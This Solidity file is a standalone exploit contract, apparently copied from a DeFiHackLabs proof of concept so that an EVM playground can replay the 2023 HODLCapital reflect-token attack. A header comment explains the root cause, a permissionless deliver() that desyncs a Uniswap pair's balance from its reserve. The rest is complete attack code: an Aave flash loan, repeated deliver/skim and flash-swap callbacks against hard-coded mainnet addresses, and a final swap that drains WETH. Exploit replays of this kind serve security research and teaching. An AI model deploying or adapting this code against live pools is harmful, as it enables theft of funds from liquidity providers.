// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-HODLCapital).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry
// `HODLCapitalExploit is Test` contract: `testExploit()` calls
// `aavePool.flashLoanSimple(address(this), ...)`, and the Aave callback
// (`executeOperation`) plus the UniswapV2 flash-swap callback
// (`uniswapV2Call`) both live on the test contract itself, with
// `address(this)` acting as the attacker. There is no standalone exploit
// contract to deploy. This file is a faithful, self-contained copy of that
// inline attack (`testExploit` -> `run`, everything else copied verbatim,
// including every helper function, loop count, and the `uniswapV2Call`
// `times`-based state machine) so the playground can deploy it and record
// `run()`. Logic and constants are copied verbatim from
// test/HODLCapital_exp.sol.
//
// Root cause: HODLCapital ($HODL) is a "reflect" (RFI-style) token. Every
// holder's balance is derived from a hidden double-entry ledger: a large
// "reflection" space (`_rOwned`, `_rTotal`) mapped down to the real "token"
// space (`_tTotal`) by a rate `_rTotal / _tTotal`. The token exposes a
// PERMISSIONLESS `deliver(tAmount)` that burns reflection value from the
// caller and permanently shrinks `_rTotal`, while `_tTotal` is left
// untouched -- nudging the rate `_rTotal/_tTotal` downward on every call.
// Because the Uniswap pair's HODL balance is *computed*
// (`balanceOf(pair) = _rOwned[pair] / rate`), the pair's reported balance and
// its internally stored `reserve1` desync -- and the AMM only enforces
// `x*y = k` against the *stored* reserve, not the live `balanceOf`. The
// attacker repeatedly calls `deliver()` (shrinking the rate) then `skim()`
// (harvesting the balanceOf-vs-reserve gap into a fee-excluded sink), which
// pumps the pair's real HODL balance far above its stored reserve. A final
// swap sells that surplus HODL for a huge amount of WETH, because the AMM's
// invariant check is trivially satisfied by a "deposit" that already sits in
// the pair's balance.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IHODL {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function deliver(uint256 amount) external;
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external returns (uint256);
    function tokenFromReflection(uint256 rAmount) external returns (uint256);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IAaveFlashloan {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract HODLCapitalExploit {
    IAaveFlashloan aavePool = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IUniswapV2Pair hodl_weth = IUniswapV2Pair(0x28E6cAB57d87E6F85ff650Fb0a7be9BE5e1897d4);
    IHODL hodl = IHODL(0xEdA47E13fD1192E32226753dC2261C4A14908fb7);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint256 amount1000 = 1000 ether;
    address excludedFromFeeAddress = 0xC9D76A540AC88182119E1AAd80136FC61Cf55fBD;
    uint256 rOwned;
    uint256 slot8;
    uint256 rTotal;
    uint256 times;

    // run() mirrors testExploit(): approve Aave and flash-borrow 140 WETH.
    // executeOperation (the Aave callback below) runs the full attack.
    function run() external {
        weth.approve(address(aavePool), type(uint256).max);
        aavePool.flashLoanSimple(address(this), address(weth), 140 ether, new bytes(1), 0);
    }

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        amountOut = numerator / denominator;
    }

    // Aave V3 flash-loan callback -- the entire attack sequence runs here,
    // copied verbatim (including every helper call, loop count, and comment)
    // from executeOperation() in test/HODLCapital_exp.sol.
    function executeOperation(
        address, /*asset*/
        uint256, /*amount*/
        uint256, /*premium*/
        address, /*initator*/
        bytes calldata /*params*/
    ) external payable returns (bool) {
        times = 2;
        (uint256 reserve0, uint256 reserve1,) = hodl_weth.getReserves();
        // uint256 amountIn = getAmountIn(amount1000 / 100000 * 10001, 13387083970661484684, 999631170221975669182);
        uint256 amountIn = getAmountIn(amount1000 / 100_000 * 10_001, reserve0, reserve1);
        weth.transfer(address(hodl_weth), amountIn);
        hodl_weth.swap(0, amount1000 / 100_000 * 10_001, address(this), new bytes(0));
        hodl.transfer(excludedFromFeeAddress, 1);
        rTotal = hodl.reflectionFromToken(amount1000, false);
        uint256 attackerBalance = hodl.balanceOf(address(this));
        uint256 attackerROwned = hodl.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        func1c44(10, 1031);

        attackerBalance = hodl.balanceOf(address(this));
        attackerROwned = hodl.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        func1c44(10, 1032);

        attackerBalance = hodl.balanceOf(address(this));
        attackerROwned = hodl.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        func1c44(10, 1032);

        attackerBalance = hodl.balanceOf(address(this));
        attackerROwned = hodl.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        func1c44(10, 1033);

        attackerBalance = hodl.balanceOf(address(this));
        attackerROwned = hodl.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        func1c44(10, 1076);

        func1c44(10, 1053);
        func1c44(5, 1024);
        func1eae(10_000);

        rTotal = hodl.reflectionFromToken(amount1000, false);
        func1c44(10, 1098);
        func1c44(10, 1084);
        func1c44(10, 1069);
        func1c44(10, 1052);
        func1c44(10, 1032);
        func1eae(5000);

        rTotal = hodl.reflectionFromToken(amount1000, false);
        func1c44(10, 1052);
        func1c44(10, 1040);
        func1c44(10, 1026);
        func1c44(3, 1010);
        func1eae(200);

        rTotal = hodl.reflectionFromToken(amount1000, false);
        func1c44(2, 1007);

        (reserve0, reserve1,) = hodl_weth.getReserves();
        amountIn = getAmountIn(reserve1 * 9000 / 10_000, reserve0, reserve1);
        weth.transfer(address(hodl_weth), amountIn);
        hodl_weth.swap(0, reserve1 * 9000 / 10_000, excludedFromFeeAddress, new bytes(0));

        for (uint256 i = 0; i < 15; i++) {
            func2574(900);
        }

        hodl.approve(address(this), type(uint256).max);
        hodl.transferFrom(address(this), excludedFromFeeAddress, 1);
        for (uint256 i = 0; i < 15; i++) {
            func2574(900);
        }

        hodl.transferFrom(address(this), excludedFromFeeAddress, 1);
        for (uint256 i = 0; i < 15; i++) {
            func2574(900);
        }

        hodl.transferFrom(address(this), excludedFromFeeAddress, 1);
        for (uint256 i = 0; i < 8; i++) {
            func2574(900);
        }

        func2574(700);
        func2574(80);
        func26cd(900);
        func26cd(100);
        func26cd(42);

        uint256 pairBalance = hodl.balanceOf(address(hodl_weth));
        (reserve0, reserve1,) = hodl_weth.getReserves();
        uint256 amountOut = getAmountOut(pairBalance - reserve1, reserve1, reserve0);
        hodl_weth.swap(amountOut, 0, address(this), new bytes(0));
        return true;
    }

    function func1c44(uint256 v0, uint256 v1) internal {
        slot8 = v1;
        uint256 v3 = hodl.tokenFromReflection(rTotal / 100 * v0);
        hodl_weth.swap(0, v3, address(this), new bytes(1));
        hodl.transfer(excludedFromFeeAddress, 1);
    }

    function func1eae(
        uint256 v0
    ) internal {
        (uint256 reserve0, uint256 reserve1,) = hodl_weth.getReserves();
        uint256 amountIn = getAmountIn(amount1000 / 100_000 * v0, reserve0, reserve1);
        weth.transfer(address(hodl_weth), amountIn);
        hodl_weth.swap(0, amount1000 / 100_000 * v0, address(this), new bytes(0));
        hodl.transfer(excludedFromFeeAddress, 1);
    }

    function func2574(
        uint256 v0
    ) internal {
        hodl.deliver(amount1000 * v0 / 1000);
        hodl_weth.skim(excludedFromFeeAddress);
    }

    function func26cd(
        uint256 v0
    ) internal {
        hodl.deliver(amount1000 * v0 / 1000);
    }

    // UniswapV2 flash-swap callback -- fired by func1c44's non-empty-data
    // swaps. `times`-based state machine copied verbatim: early phase
    // (times <= 5) delivers based on the attacker's own rOwned delta; later
    // phase (5 < times <= 25) delivers based on the pair-balance-vs-reserve
    // gap scaled by slot8.
    function uniswapV2Call(
        address, /*sender*/
        uint256, /*amount0*/
        uint256, /*amount1*/
        bytes calldata /*data*/
    ) external {
        if (times > 5) {
            if (times <= 25) {
                uint256 pairBalance = hodl.balanceOf(address(hodl_weth));
                (, uint256 reserve1,) = hodl_weth.getReserves();
                hodl.deliver((reserve1 - pairBalance) * slot8 / 1000);
                times += 1;
            }
        } else {
            uint256 attackerBalance = hodl.balanceOf(address(this));
            uint256 v14 = hodl.reflectionFromToken(attackerBalance, false);
            uint256 v17 = hodl.tokenFromReflection(v14 - rOwned);
            hodl.deliver(v17);
            uint256 pairBalance = hodl.balanceOf(address(hodl_weth));
            (uint256 reserve0, uint256 reserve1,) = hodl_weth.getReserves();
            uint256 amountIn = getAmountIn(reserve1 - pairBalance, reserve0, reserve1);
            weth.transfer(address(hodl_weth), amountIn * slot8 / 1000);
            times += 1;
        }
    }
}
